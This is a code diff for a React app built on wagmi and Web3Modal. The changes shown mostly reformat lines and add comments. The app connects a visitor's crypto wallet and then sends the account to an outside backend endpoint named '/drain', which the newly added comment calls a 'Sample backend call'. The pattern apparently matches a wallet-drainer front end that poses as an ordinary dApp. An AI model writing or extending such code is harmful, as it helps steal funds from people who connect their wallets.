@@ -1,19 +1,25 @@
 import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
 
+// Wagmi + Viem imports
 import { WagmiConfig, createConfig, configureChains } from "wagmi";
 import { mainnet, sepolia } from "@wagmi/chains";
-import { publicProvider } from "viem/providers/public"; // <-- fixed import
+import { publicProvider } from "viem/providers/public";
 import { InjectedConnector } from "wagmi/connectors/injected";
 import { WalletConnectConnector } from "wagmi/connectors/walletConnect";
-import { Web3Modal, useWeb3Modal } from "@web3modal/react"; // <-- updated for v2
+
+// Web3Modal v2
+import { Web3Modal, useWeb3Modal } from "@web3modal/react";
 
 /* ---------------------------
    Wagmi Configuration
 ---------------------------- */
 const projectId = "962425907914a3e80a7d8e7288b23f62";
 
-const { chains, publicClient } = configureChains([mainnet, sepolia], [publicProvider()]);
+const { chains, publicClient } = configureChains(
+  [mainnet, sepolia],
+  [publicProvider()]
+);
 
 const config = createConfig({
   autoConnect: true,
@@ -32,19 +38,21 @@ const App = () => {
   const [response, setResponse] = useState(null);
   const [walletAddress, setWalletAddress] = useState(null);
 
-  const { open } = useWeb3Modal(); // hook from Web3Modal v2
+  const { open } = useWeb3Modal();
 
   const connectWallet = async () => {
     try {
       setLoading(true);
       setResponse(null);
 
+      // Open Web3Modal
       const connection = await open();
       const account = connection?.accounts?.[0];
       if (!account) throw new Error("No wallet connected");
 
       setWalletAddress(account);
 
+      // Sample backend call
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -55,6 +63,7 @@ const App = () => {
       });
 
       const data = await res.json();
+
       setResponse({
         success: res.ok,
         message: res.ok
@@ -139,7 +148,7 @@ const App = () => {
           )}
         </div>
 
-        {/* Web3Modal component */}
+        {/* Web3Modal Component */}
         <Web3Modal projectId={projectId} themeMode="dark" />
       </div>
     </WagmiConfig>
